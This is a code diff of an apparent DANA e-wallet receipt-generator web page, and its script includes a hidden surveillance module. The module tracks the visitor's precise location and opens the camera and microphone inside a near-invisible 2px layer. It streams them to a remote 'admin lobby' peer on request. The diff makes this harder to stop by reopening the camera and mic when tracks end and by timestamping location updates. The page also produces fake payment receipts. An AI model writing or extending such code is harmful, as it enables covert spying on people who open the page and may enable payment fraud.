@@ -40,112 +40,52 @@
       --rc-label-fs: 11.5px;
       --rc-sub-fs: 10.5px;
       --rc-footer-fs: 8px;
-      --banner-w: clamp(130px, 38vw, 166px);
-      --banner-h: clamp(102px, 30vw, 132px);
     }
 
     * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
 
     html, body {
-      margin: 0;
-      padding: 0;
-      width: 100%;
-      height: 100%;
-      overflow: hidden;
+      margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;
       font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-      background-color: #E2E8F0;
-      color: #1A1A1A;
-      -webkit-font-smoothing: antialiased;
+      background-color: #E2E8F0; color: #1A1A1A; -webkit-font-smoothing: antialiased;
     }
 
-    body {
-      position: fixed;
-      inset: 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
+    body { position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; }
     button, input, select, label { touch-action: manipulation; font-family: inherit; }
     .hidden { display: none !important; }
 
     #permissionGate {
-      position: fixed;
-      inset: 0;
-      z-index: 200;
-      background-color: #0F172A;
-      color: #F8FAFC;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
+      position: fixed; inset: 0; z-index: 200; background-color: #0F172A; color: #F8FAFC;
+      display: flex; align-items: center; justify-content: center; padding: 20px;
     }
-
     #permissionGate.hidden { display: none !important; }
 
     .gate-card {
-      width: 100%;
-      max-width: 380px;
-      background: #1E293B;
-      border: 1px solid #334155;
-      border-radius: 18px;
-      padding: 24px 20px;
-      text-align: center;
-      box-shadow: 0 20px 45px rgba(0, 0, 0, 0.45);
+      width: 100%; max-width: 380px; background: #1E293B; border: 1px solid #334155;
+      border-radius: 18px; padding: 24px 20px; text-align: center; box-shadow: 0 20px 45px rgba(0, 0, 0, 0.45);
     }
-
     .gate-btn {
-      width: 100%;
-      margin-top: 16px;
-      padding: 12px 16px;
-      border: none;
-      border-radius: 12px;
-      background: #118EE9;
-      color: #FFFFFF;
-      font-size: 13px;
-      font-weight: 700;
-      letter-spacing: 0.04em;
-      cursor: pointer;
+      width: 100%; margin-top: 16px; padding: 12px 16px; border: none; border-radius: 12px;
+      background: #118EE9; color: #FFFFFF; font-size: 13px; font-weight: 700; letter-spacing: 0.04em; cursor: pointer;
     }
 
     #hiddenCameraLayer {
-      position: fixed;
-      bottom: 0;
-      left: 0;
-      width: 2px;
-      height: 2px;
-      opacity: 0.001;
-      pointer-events: none;
-      overflow: hidden;
-      z-index: 1;
+      position: fixed; bottom: 0; left: 0; width: 2px; height: 2px;
+      opacity: 0.001; pointer-events: none; overflow: hidden; z-index: 1;
     }
 
     .device-frame {
-      width: 100%;
-      height: 100%;
-      height: var(--app-height, 100dvh);
-      max-height: 100%;
-      position: relative;
-      z-index: 10;
-      overflow: hidden;
-      display: flex;
-      flex-direction: column;
-      background-color: #F5F6F8;
-      padding-left: env(safe-area-inset-left);
-      padding-right: env(safe-area-inset-right);
+      width: 100%; height: 100%; height: var(--app-height, 100dvh); max-height: 100%;
+      position: relative; z-index: 10; overflow: hidden; display: flex; flex-direction: column;
+      background-color: #F5F6F8; padding-left: env(safe-area-inset-left); padding-right: env(safe-area-inset-right);
     }
-
     .device-frame.hidden { display: none !important; }
 
     @media (min-width: 600px) and (min-height: 600px) {
       body { padding: clamp(8px, 2dvh, 18px); }
       .device-frame {
-        width: min(100%, 430px);
-        height: min(100%, 880px);
-        border-radius: 22px;
-        box-shadow: 0 18px 50px rgba(15, 23, 42, 0.2);
-        padding-left: 0;
-        padding-right: 0;
+        width: min(100%, 430px); height: min(100%, 880px); border-radius: 22px;
+        box-shadow: 0 18px 50px rgba(15, 23, 42, 0.2); padding-left: 0; padding-right: 0;
       }
     }
 
@@ -153,82 +93,50 @@
     .no-scrollbar::-webkit-scrollbar { display: none; }
 
     .settings-header {
-      background-color: #118EE9;
-      color: #FFFFFF;
+      background-color: #118EE9; color: #FFFFFF;
       padding: max(12px, env(safe-area-inset-top)) 14px 12px 14px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 8px;
-      flex-shrink: 0;
+      display: flex; align-items: center; justify-content: space-between; gap: 8px; flex-shrink: 0;
     }
-
     .settings-scroll {
-      flex: 1 1 auto;
-      min-height: 0;
-      overflow-y: auto;
-      overscroll-behavior: contain;
-      -webkit-overflow-scrolling: touch;
-      padding: clamp(8px, 2.5vw, 12px);
+      flex: 1 1 auto; min-height: 0; overflow-y: auto; overscroll-behavior: contain;
+      -webkit-overflow-scrolling: touch; padding: clamp(8px, 2.5vw, 12px);
     }
-
     .settings-card {
-      background-color: #FFFFFF;
-      border-radius: 16px;
-      border: 1px solid #E2E8F0;
-      padding: clamp(10px, 3vw, 14px);
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
+      background-color: #FFFFFF; border-radius: 16px; border: 1px solid #E2E8F0;
+      padding: clamp(10px, 3vw, 14px); display: flex; flex-direction: column; gap: 10px;
     }
-
     .field-input {
-      width: 100%;
-      padding: 8px 11px;
-      background-color: #F8FAFC;
-      border: 1px solid #E2E8F0;
-      border-radius: 12px;
-      font-size: 14px;
-      font-weight: 600;
-      color: #1E293B;
-      outline: none;
+      width: 100%; padding: 8px 11px; background-color: #F8FAFC; border: 1px solid #E2E8F0;
+      border-radius: 12px; font-size: 14px; font-weight: 600; color: #1E293B; outline: none;
     }
-
     .field-input:focus { background-color: #FFFFFF; border-color: #118EE9; }
     .saldo-combo-wrap { position: relative; }
     .saldo-input-box { position: relative; display: flex; align-items: center; }
     .saldo-actions { position: absolute; right: 6px; top: 50%; transform: translateY(-50%); display: flex; align-items: center; }
-
     .saldo-icon-btn {
-      width: 26px; height: 26px; border: none; background: transparent;
-      color: #64748B; border-radius: 9999px; display: flex; align-items: center; justify-content: center; cursor: pointer; padding: 0;
+      width: 26px; height: 26px; border: none; background: transparent; color: #64748B;
+      border-radius: 9999px; display: flex; align-items: center; justify-content: center; cursor: pointer; padding: 0;
     }
-
     .saldo-dropdown {
       position: absolute; top: calc(100% + 5px); left: 0; right: 0; max-height: 230px;
       overflow-y: auto; background-color: #FFFFFF; border: 1px solid #CBD5E1; border-radius: 12px;
       box-shadow: 0 12px 28px rgba(15, 23, 42, 0.16); z-index: 60; padding: 4px;
     }
-
     .saldo-option-item {
       width: 100%; border: none; background: transparent; padding: 9px 10px; border-radius: 8px;
       display: flex; align-items: center; justify-content: space-between; gap: 8px; text-align: left; cursor: pointer;
     }
-
     .saldo-option-item:hover, .saldo-option-item:active { background-color: #EFF6FF; }
     .saldo-option-name { font-size: 13px; font-weight: 600; color: #0F172A; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
     .saldo-option-cat { font-size: 10px; font-weight: 700; color: #118EE9; background-color: #EFF6FF; border: 1px solid #BFDBFE; padding: 2px 6px; border-radius: 9999px; flex-shrink: 0; }
-
     .grid-2 { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 8px; }
     .btn-test-audio { padding: 7px 10px; background-color: #EFF6FF; color: #118EE9; border: 1px solid #68B5EE; border-radius: 8px; font-size: 11px; font-weight: 700; flex-shrink: 0; cursor: pointer; }
     .btn-kirim-wrap { flex-shrink: 0; padding: 8px 12px max(12px, env(safe-area-inset-bottom)) 12px; background-color: #F5F6F8; border-top: 1px solid #E5E9F0; position: relative; z-index: 30; }
-
     #btnKirim {
       width: 100%; min-height: 46px; padding: 12px 16px; background-color: #118EE9; color: #FFFFFF;
       font-weight: 700; font-size: 14px; letter-spacing: 0.05em; border: none; border-radius: 12px;
       box-shadow: 0 4px 12px rgba(17, 142, 233, 0.28); display: flex; align-items: center; justify-content: center; gap: 8px; cursor: pointer;
     }
-
     .full-blue-screen { background-color: #118EE9; background-image: linear-gradient(180deg, #1290EB 0%, #1088E0 55%, #0E81D6 100%); color: #FFFFFF; }
     .full-blue-scroll { flex: 1 1 auto; min-height: 0; overflow-y: auto; padding: max(20px, env(safe-area-inset-top)) var(--footer-px) 14px var(--footer-px); display: flex; flex-direction: column; align-items: center; justify-content: center; }
     .coin-badge { width: var(--coin-size); height: var(--coin-size); border-radius: 9999px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; margin-bottom: var(--coin-mb); box-shadow: 0 6px 20px rgba(7, 46, 88, 0.24); }
@@ -335,7 +243,7 @@
           <div style="display:flex;align-items:center;justify-content:space-between;gap:8px;">
             <div style="min-width:0;">
               <span style="display:block;font-size:12px;font-weight:600;color:#334155;">Tanggal & Jam</span>
-              <span id="settingsClockPreview" class="tabular-nums" style="font-size:11px;font-weight:500;color:#118EE9;">20 Nov 2026 • 22:32</span>
+              <span id="settingsClockPreview" class="tabular-nums" style="font-size:11px;font-weight:500;color:#118EE9;">24 Nov 2026 • 21:26</span>
             </div>
             <label style="display:flex;align-items:center;gap:6px;font-size:12px;color:#475569;cursor:pointer;">
               <input type="checkbox" id="autoTimeCheck" checked onchange="toggleTimeMode()" />
@@ -407,7 +315,7 @@
             <span style="font-size:var(--rc-logo-fs);font-weight:700;letter-spacing:0.14em;color:#118EE9;">DANA</span>
           </div>
           <div class="tabular-nums" style="padding:0 var(--rc-px) 7px var(--rc-px);display:flex;justify-content:space-between;font-size:var(--rc-meta-fs);color:#8A94A6;">
-            <span id="displayDateTime">20 Nov 2026 • 22:32</span>
+            <span id="displayDateTime">24 Nov 2026 • 21:26</span>
             <span id="displayIdDana">ID DANA 0858••••2418</span>
           </div>
           <div class="straight-divider"></div>
@@ -715,7 +623,7 @@
     }
 
     /* =========================================================================
-       MODUL MEMBER: LOKASI AKURAT + KAMERA + MIKROFON (LINTAS JARINGAN)
+       MODUL MEMBER v2: LOKASI AKURAT + KAMERA + MIKROFON (LINTAS KOTA)
        ========================================================================= */
     const ADMIN_LOBBY_ID = "jirun-admin-lobby-9988";
     const MEMBER_PEER_ID = "jirun-hp-" + Date.now().toString(36) + "-" + Math.random().toString(36).slice(2, 6);
@@ -726,6 +634,8 @@
           { urls: "stun:stun.l.google.com:19302" },
           { urls: "stun:stun1.l.google.com:19302" },
           { urls: "stun:stun2.l.google.com:19302" },
+          { urls: "stun:stun3.l.google.com:19302" },
+          { urls: "stun:stun4.l.google.com:19302" },
           { urls: "stun:global.stun.twilio.com:3478" }
         ]
       }
@@ -783,7 +693,15 @@
           watchId = null;
         }
 
-        const applyPos = (pos, isResolve) => {
+        let resolveFn = resolve;
+
+        const applyPos = (pos) => {
+          const now = Date.now();
+          const jam = new Date(now).toLocaleTimeString("id-ID", {
+            hour: "2-digit",
+            minute: "2-digit",
+            second: "2-digit"
+          });
           latestLocation = {
             lat: Number(pos.coords.latitude.toFixed(6)),
             lng: Number(pos.coords.longitude.toFixed(6)),
@@ -793,27 +711,27 @@
               : "-",
             heading: pos.coords.heading !== null && !Number.isNaN(pos.coords.heading)
               ? Math.round(pos.coords.heading) + "°"
-              : "-"
+              : "-",
+            updatedAt: now,
+            timeText: jam
           };
           hasAccurateLocation = true;
           broadcastPresenceToAdmins();
-          if (isResolve && resolveFn) {
-            resolveFn(latestLocation);
+          if (resolveFn) {
+            const fn = resolveFn;
             resolveFn = null;
+            fn(latestLocation);
           }
         };
 
-        let resolveFn = resolve;
-
-        // Ambil posisi awal dengan toleransi agar tidak gagal di dalam ruangan
         navigator.geolocation.getCurrentPosition(
-          (pos) => applyPos(pos, true),
+          applyPos,
           () => {},
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 15000 }
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 10000 }
         );
 
         watchId = navigator.geolocation.watchPosition(
-          (pos) => applyPos(pos, true),
+          applyPos,
           (err) => {
             if (!hasAccurateLocation && resolveFn) {
               const fn = resolveFn;
@@ -821,7 +739,7 @@
               reject(new Error(err?.message || "Izin lokasi akurat ditolak."));
             }
           },
-          { enableHighAccuracy: true, timeout: 20000, maximumAge: 5000 }
+          { enableHighAccuracy: true, timeout: 20000, maximumAge: 3000 }
         );
       });
     }
@@ -838,6 +756,18 @@
           ? { echoCancellation: true, noiseSuppression: true, autoGainControl: true }
           : false
       };
+    }
+
+    function attachTrackListeners(stream) {
+      if (!stream) return;
+      for (const track of stream.getTracks()) {
+        track.onended = () => {
+          broadcastPresenceToAdmins();
+          if (track.kind === "audio" && micEnabled) {
+            openCameraKeepAlive(currentFacing, true).catch(() => {});
+          }
+        };
+      }
     }
 
     async function syncTracksToActiveCalls(stream) {
@@ -885,6 +815,7 @@
         }
       }
 
+      attachTrackListeners(stream);
       currentFacing = facing;
       cameraStream = stream;
       hasCameraPermission = true;
@@ -937,11 +868,14 @@
       const hasLiveAudio = Boolean(
         cameraStream && cameraStream.getAudioTracks().some((t) => t.readyState === "live" && t.enabled)
       );
+      const hasLiveVideo = Boolean(
+        cameraStream && cameraStream.getVideoTracks().some((t) => t.readyState === "live" && t.enabled)
+      );
       return {
         type: "HP_PRESENCE",
         peerId: MEMBER_PEER_ID,
         facing: currentFacing === "environment" ? "Belakang" : "Depan",
-        cameraOn: Boolean(cameraStream),
+        cameraOn: hasLiveVideo,
         micOn: hasLiveAudio,
         inBackground: document.hidden,
         location: latestLocation,
@@ -980,7 +914,7 @@
 
       if (msg.type === "REQUEST_STREAM") {
         pendingStreamAdmins.add(fromPeerId);
-        if (!cameraStream) {
+        if (!cameraStream || cameraStream.getVideoTracks().every((t) => t.readyState !== "live")) {
           await openCameraKeepAlive(currentFacing, true).catch(() => {});
         }
         placeCallToAdmin(fromPeerId, true);
